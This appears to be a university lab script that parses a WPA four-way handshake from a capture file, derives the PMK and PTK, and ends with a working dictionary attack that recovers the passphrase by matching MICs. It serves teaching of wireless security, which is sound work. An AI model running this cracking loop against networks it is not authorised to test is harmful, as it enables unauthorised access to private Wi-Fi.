#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA).

Extrait le SSID, les MAC client et AP, les deux nonces et le MIC du fichier pcap fourni.

Permet de retrouver la passphrase en la bruteforce à l'aide d'un dictionaire puis en comparant le MIC généré avec le MIC du pcap fourni.
"""

__author__      = "Olivier Koffi et Samuel Metler"
__copyright__   = "Copyright 2020, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "olivier.koffi@heig-vd.ch et samuel.metler@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
#from scapy.contrib.wpa_eapol import WPA_key 

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = "SWI"
APmac       = a2b_hex("cebcc8fdcab7")
Clientmac   = a2b_hex("0013efd015bd")

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex("90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91")
SNonce      = a2b_hex("7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577")

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = "36eef66540fa801ceee2fea9b7929b40"

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") 


#####################################
#                                   #
#       WPA Params extraction       #
#                                   #
#####################################

# This function allow to manually extract the nonce from a WPA handshake payload
def extract_nonce (payload) :
    return bytes(payload[17:49]).hex()

# This function allow to manually extract the MIC from from a WPA handshake payload
def extract_mic (payload) :
    return bytes(payload[81:97]).hex()


ssid_ret = wpa[0][Dot11Elt].info.decode()
APmac_ret = wpa[5][Dot11].addr2
Clientmac_ret = wpa[5][Dot11].addr1
ANonce_ret = extract_nonce(bytes(wpa[5][EAPOL]))
SNonce_ret = extract_nonce(bytes(wpa[6][EAPOL]))
# The MIC from the fourth frame WPA handshake guaranteed that it comes from a user that knows the correct passphrase.
Mic4_ret = extract_mic(bytes(wpa[8][EAPOL]))


print ("\n\nValues from the pcap file")
print ("============================")
print ("SSID: ", ssid_ret, "\n")
print ("AP Mac: ", APmac_ret, "\n")
print ("Client Mac: ", Clientmac_ret, "\n")
print ("AP Nonce: ", ANonce_ret, "\n")
print ("Client Nonce: ", SNonce_ret,"\n")
print ("MIC: ", Mic4_ret,"\n")


#cf "Quelques détails importants" dans la donnée
print ("\n\nValues used to derivate keys")
print ("============================")
print ("Passphrase: ",passPhrase,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")

#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
passPhrase = str.encode(passPhrase)
ssid = str.encode(ssid)
pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

#expand pmk to obtain PTK
ptk = customPRF512(pmk,str.encode(A),B)

#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
mic = hmac.new(ptk[0:16],data,hashlib.sha1)


print ("\nResults of the key expansion")
print ("=============================")
print ("PMK:\t\t",pmk.hex(),"\n")
print ("PTK:\t\t",ptk.hex(),"\n")
print ("KCK:\t\t",ptk[0:16].hex(),"\n")
print ("KEK:\t\t",ptk[16:32].hex(),"\n")
print ("TK:\t\t",ptk[32:48].hex(),"\n")
print ("MICK:\t\t",ptk[48:64].hex(),"\n")
print ("MIC:\t\t",mic.hexdigest(),"\n")


#####################################
#                                   #
#       Crack WPA Passphrase        #
#                                   #
#####################################

passwords_file = open('./10k_most_common_passwords.txt','r')
passwords = passwords_file.readlines()
passphrase_ret = "Not found"
mic_to_test = a2b_hex("36eef66540fa801ceee2fea9b7929b40fdb0abaa").hex()
data = bytes(wpa[8]['EAPOL'])[:77] + b'\x00' * 22


print ("\nCracking WPA Passphrase")
print ("=============================")
for psw in passwords :
    
    # We don't take the final '\n'
    passPhrase = str.encode(psw[:-1])

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #Check if it's MD5 or SHA1 with the KeyDescriptorVersion
    kdv = int.from_bytes(wpa[8].load[0:1], byteorder='big')

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    if kdv == 2:
        mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()
    else:
        mic = hmac.new(ptk[0:16],data,hashlib.md5).hexdigest()  

    print ("Passphrase tested : ",psw)
    print (mic)
        
    #Compare the MICs
    if hmac.compare_digest(mic, mic_to_test) :
        print ("\nPassphrase found !\n")
        passphrase_ret = psw
        break

print ("\nResult of the passphrase cracking")
print ("=============================")
print ("The passphrase is : ",passphrase_ret,"\n")


passwords_file.close()


